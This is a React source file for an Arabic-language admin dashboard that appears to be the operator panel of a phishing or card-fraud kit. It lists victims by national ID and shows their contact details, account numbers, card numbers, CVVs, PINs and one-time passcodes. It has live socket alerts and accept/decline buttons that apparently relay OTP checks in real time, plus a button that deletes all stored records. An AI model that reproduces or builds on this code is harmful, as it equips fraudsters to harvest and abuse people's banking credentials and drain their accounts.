import React, { useEffect, useState } from "react";
import { serverRoute, token } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { IoMdRefresh } from "react-icons/io";

const Main = () => {
  const socket = io(serverRoute);
  const [activeUsers, setActiveUsers] = useState([]);
  const [Users, setUsers] = useState([]);
  const [user, setUser] = useState({ data: {}, active: false });

  const getUsers = async () => {
    await axios
      .get(`${serverRoute}/users`)
      .then((res) => {
        setUsers(res.data);

        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      })
      .catch((error) => {
        console.log(error);
      });
  };

  const handleDisplay = async (id) => {
    const user = Users.find((u) => u._id === id);
    if (!user.checked) {
      await axios.get(serverRoute + "/order/checked/" + id);
    }
    console.log(user);
    getUsers();
    setUser({ data: user, active: true });
  };

  useEffect(() => {
    getUsers();
  }, []);

  const handleAcceptVisa = async (id) => {
    socket.emit("acceptVisa", id);
    setUser({
      data: { ...user.data, visaAccept: true },
      active: true,
    });
    await getUsers();
  };
  const handleDeclineVisa = (data) => {
    socket.emit("declineVisa", data);
    const _user = Users.find((u) => {
      if (u._id === data._id) {
        return { ...u, visaAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== data._id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, visaAccept: true }, active: true });
  };

  const handleAcceptOtp = async (id) => {
    socket.emit("acceptOtp", id);
    setUser({ data: { ...user.data, otpAccept: true }, active: true });
    await getUsers();
  };
  const handleDeclineOtp = (data) => {
    socket.emit("declineOtp", data);
    const _user = Users.find((u) => {
      if (u._id === data._id) {
        return { ...u, otpAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== data._id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, otpAccept: true }, active: true });
  };

  const deleteAll = async () => {
    await axios
      .delete(serverRoute + "/orders")
      .then(() => window.location.reload());
  };

  socket.on("form", async () => {
    await getUsers();
  });

  socket.on("visa", async (data) => {
    await getUsers();
  });
  socket.on("otp", async (data) => {
    await getUsers();
  });

  return (
    <div
      className="flex w-full flex-col bg-gray-200 relative h-screen"
      dir="rtl"
    >
      <div
        className="fixed left-5 bottom-2 cursor-pointer p-2 bg-sky-800 rounded-full  text-white"
        onClick={() => window.location.reload()}
      >
        <IoMdRefresh className="text-3xl  " />
      </div>

      <div className="flex w-full items-center h-screen  md:flex-row  ">
        {/* // Notifactions */}

        <div className="w-1/4 border-l border-gray-500 h-full flex flex-col  ">
          <span className="md:p-5 py-2 px-1 w-full md:text-xl text-lg text-center  border-b border-black">
            مستخدمين
          </span>
          <div className="w-full flex flex-col overflow-y-auto h-full">
            {Users.length
              ? Users.map((user, idx) => {
                  return (
                    <div
                      className="w-full px-2 py-3 md:text-lg text-sm flex justify-between items-center border-b-2 border-gray-500 cursor-pointer hover:opacity-70"
                      onClick={() => handleDisplay(user._id)}
                    >
                      <span
                        className={`w-2 h-2 bg-green-500 rounded-full ${
                          activeUsers.find((u) => u._id === user._id)
                            ? "visible"
                            : "hidden"
                        }`}
                      ></span>
                      <span className="flex-1 text-center text-gray-700 md:text-sm  text-xs ">
                        {user.nationalId}
                      </span>
                    </div>
                  );
                })
              : ""}
          </div>
        </div>

        {/* data */}

        {user.active ? (
          <div className="w-3/4 border-l  border-gray-500 h-screen overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 items-start place-content-start gap-5 px-3">
            <span
              className="px-3 py-2 w-full  md:col-span-2 lg:col-span-3 text-xl text-center border-b border-black "
              dir="rtl"
            >
              بيانات عميل
            </span>
            {user.data?.nationalId ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات التسجيل</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span>رقم هوية</span>
                  <span>{user.data?.nationalId} </span>
                </div>
                {user.data.type ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> أسم </span>
                    <span>{user.data?.fullName}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.email ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> ايميل </span>
                    <span>{user.data?.email}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.phone ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم الهاتف </span>
                    <span>{user.data?.phone}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.accountNumber ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم الحساب </span>
                    <span>{user.data?.accountNumber}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.nationalId ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>رقم الهوية </span>
                    <span>{user.data?.nationalId}</span>
                  </div>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}

            {user.data?.cardNumber ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات فيزا</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span>رقم كارت</span>
                  <span>{user.data?.cardNumber} </span>
                </div>
                {user.data.card_name ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>أسم حامل البطاقة</span>
                    <span>{user.data?.card_name}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.expiryDate ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> تاريخ إنتهاء</span>
                    <span>{user.data?.expiryDate}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.cvv ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>cvv </span>
                    <span>{user.data?.cvv}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.pin ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>pin </span>
                    <span>{user.data?.pin}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.money ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>طلب حد الرفع </span>
                    <span>{user.data?.money}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.visaAccept ? (
                  ""
                ) : (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptVisa(user.data)}
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineVisa(user.data)}
                    >
                      رفض
                    </button>
                  </div>
                )}

                {user.data.otp ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> otp </span>
                      <span>{user.data?.otp}</span>
                    </div>
                    {user.data.otpAccept ? (
                      ""
                    ) : (
                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptOtp(user.data)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineOtp(user.data)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}
          </div>
        ) : (
          ""
        )}
        <div
          className="fixed bottom-16 cursor-pointer left-5 bg-red-500 text-white rounded-full w-12 h-12 text-3xl text-center"
          onClick={deleteAll}
        >
          x
        </div>
      </div>
    </div>
  );
};

export default Main;
